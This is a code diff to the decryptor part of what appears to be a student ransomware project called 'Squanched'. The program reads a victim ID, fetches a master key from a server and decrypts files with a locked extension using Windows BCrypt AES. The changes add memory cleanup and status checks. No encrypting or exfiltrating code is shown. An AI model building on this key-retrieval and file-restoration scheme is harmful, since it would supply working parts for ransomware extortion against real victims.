@@ -6,33 +6,37 @@
 std::string hex_to_string(const std::string& input);
 DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 
-DWORD DecryptKeyIV(PBYTE keyIV, PBYTE* keyIVBuff,  PBYTE masterKey, PBYTE masterIV)
+Status DecryptKeyIV(PBYTE keyIV, PBYTE* keyIVBuff,  PBYTE masterKey, PBYTE masterIV)
 {
-	DWORD status;
+	Status status;
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
 	BCRYPT_KEY_HANDLE keyHandle;
+	PBYTE tmpIv = nullptr;
 	status = getKeyHandle(masterKey, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto DEC_KEY_IV_CLEAN;
 	}
 	DWORD  resSize;
 	//CHECK IF NEEDED V
-	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if (NULL == tmpIv) {
-		//TODO cleanup
+		goto DEC_KEY_IV_CLEAN;
 	}
 	memcpy(tmpIv, masterIV, IV_LEN);
 	status = BCryptDecrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, nullptr, tmpIv, IV_LEN, *keyIVBuff, KEY_LEN + IV_LEN, &resSize, 0);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto DEC_KEY_IV_CLEAN;
 	}
+DEC_KEY_IV_CLEAN:
+	if(tmpIv)
+		HeapFree(GetProcessHeap(), 0, tmpIv);
 
 	return status;
 }
 
-DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
+Status getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
 {
-	DWORD status;
+	Status status;
 	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
 	if (!NT_SUCCESS(status)) {
 		return status;
@@ -71,56 +75,75 @@ void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD Ciphe
 	PBYTE   TempInitVector = NULL;
 	DWORD   TempInitVectorLength = 0;
 	DWORD   ResultLength = 0;
-
+	PBYTE plainText = nullptr;
+	PBYTE tmpIv = nullptr;
+	std::ofstream ofile;
 	BCRYPT_KEY_HANDLE keyHandle;
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
+	string plainPath = path, ext = string(LOCKED_EXTENSION);
+	string::size_type i = plainPath.find(ext);
 	status = getKeyHandle(key, keyHandle, aesHandle);
-
+	if(!NT_SUCCESS(status))
+	{
+		goto DECCLEAN;
+	}
 	DWORD plainSize, resSize;
 	//CHECK IF NEEDED V
-	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if (NULL == tmpIv) {
-		//TODO cleanup
+		goto DECCLEAN;
 	}
 	memcpy(tmpIv, iv, IV_LEN);
 	status = BCryptDecrypt(keyHandle, CipherText, CipherTextLength, NULL, tmpIv, IV_LEN, NULL, 0, &plainSize, BCRYPT_BLOCK_PADDING);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto DECCLEAN;
 	}
-	PBYTE plainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, plainSize);
+	plainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, plainSize);
 	if (NULL == plainText) {
-		//TODO cleanup
+		goto DECCLEAN;
 	}
 	status = BCryptDecrypt(keyHandle, CipherText, CipherTextLength, NULL, tmpIv, IV_LEN, plainText, plainSize, &resSize, BCRYPT_BLOCK_PADDING);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		goto DECCLEAN;
 	}
 #ifdef DEBUG
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
-	string plainPath = path, ext = string(LOCKED_EXTENSION);
-	string::size_type i = plainPath.find(ext);
+	
 	if(string::npos != i)
 	{
 		plainPath.erase(i, ext.length());
 	}
 	
-	std::ofstream ofile(plainPath.c_str(), std::ios::binary);
+	ofile = std::ofstream(plainPath.c_str(), std::ios::binary);
 	ofile.write((char*)plainText, plainSize - paddingSize);
 	ofile.close();
+DECCLEAN:
+	if (tmpIv)
+		HeapFree(GetProcessHeap(), 0, tmpIv);
+	if (plainText)
+		HeapFree(GetProcessHeap(), 0, plainText);
 
 }
 
 void decrypt_wrapper(string path, PBYTE masterIV, PBYTE masterKey)
 {
-	if (!do_decrypt(path)) return;
-	PBYTE keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
-	PBYTE keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
-	PBYTE iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
-	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
-	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN - IV_DIGITS_NUM;
-	PBYTE cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
 	std::ifstream ifile;
+	PBYTE keyIV = nullptr, keyIVBuff = nullptr, iv = nullptr, key = nullptr, cipher = nullptr;
+	Status status;
+	if (!do_decrypt(path)) return;
+	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+	if (keyIV == nullptr) goto CLEAN;
+	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+	if (keyIVBuff == nullptr) goto CLEAN;
+	iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if (iv == nullptr) goto CLEAN;
+	key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
+	if (key == nullptr) goto CLEAN;
+	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN - IV_DIGITS_NUM;
+	cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
+	if (cipher == nullptr) goto CLEAN;
+	
 	ifile.open(path, std::ios::binary);
 #ifdef DEBUG
 	cout << "file was" << (ifile.is_open() ? "" : "NOT") << "openned successfully" << endl;
@@ -132,10 +155,25 @@ void decrypt_wrapper(string path, PBYTE masterIV, PBYTE masterKey)
 	ifile.read((char*)cipher, cipherSize);
 	ifile.close();
 	//TODO add status read
-	DecryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
+	status = DecryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
+	if(!NT_SUCCESS(status))
+	{
+		goto CLEAN;
+	}
 	memcpy(key, keyIVBuff, KEY_LEN);
 	memcpy(iv, keyIVBuff + KEY_LEN, IV_LEN);
 	DecryptData(path,key,iv,cipher,cipherSize, paddingSize);
+CLEAN:
+	if (keyIV)
+		HeapFree(GetProcessHeap(), 0, keyIV);
+	if (keyIVBuff)
+		HeapFree(GetProcessHeap(), 0, keyIVBuff);
+	if (iv)
+		HeapFree(GetProcessHeap(), 0, iv);
+	if (key)
+		HeapFree(GetProcessHeap(), 0, key);
+	if (cipher)
+		HeapFree(GetProcessHeap(), 0, cipher);
 }
 std::string hex_to_string(const std::string& input)
 {
@@ -162,40 +200,40 @@ std::string hex_to_string(const std::string& input)
 int main()
 {
 	PBYTE masterIV = nullptr, masterKey = nullptr;
+	std::string id;
 	Status status;
-	masterIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
-	if(masterIV == nullptr)
-	{
-		//TODO cleanup
-	}
-	masterKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
-	if (masterKey == nullptr)
-	{
-		//TODO cleanup
-	}
+	string path = ROOT_DIR;
+	string pathToID = get_home() + R"(\SquanchedID.id)";
+	std::ifstream idFile;
+	string sMasterIV, sMasterKey;
+
 //	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
 //	std::ifstream masterKeyIVFile;
 //	masterKeyIVFile.open(pathToMasters, std::ios::binary);
 //	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
 //	masterKeyIVFile.read((char*)masterIV, IV_LEN);
 //	masterKeyIVFile.close();
-	string pathToID = get_home() + R"(\SquanchedID.id)";
-	std::ifstream idFile;
+	
+	
 	idFile.open(pathToID, std::ios::binary);
-	std::string id((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
+	id = std::string((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
 	idFile.close();
 	id = string_to_hex(id);
-	string sMasterIV, sMasterKey;
+	
 	status = getFromServer(id, sMasterIV, sMasterKey);
-	//TODO Check status
+	if(!NT_SUCCESS(status))
+	{
+		return -1;
+	}
 	sMasterIV = hex_to_string(sMasterIV);
 	sMasterKey = hex_to_string(sMasterKey);
 	masterIV = (BYTE*)sMasterIV.c_str();
 	masterKey = (BYTE*)sMasterKey.c_str();
-	string path = ROOT_DIR;
+	
 	iterate(path, &decrypt_wrapper, masterIV, masterKey);
 
 	//HeapFree(cipher);
+
 	return 0;
 }
 
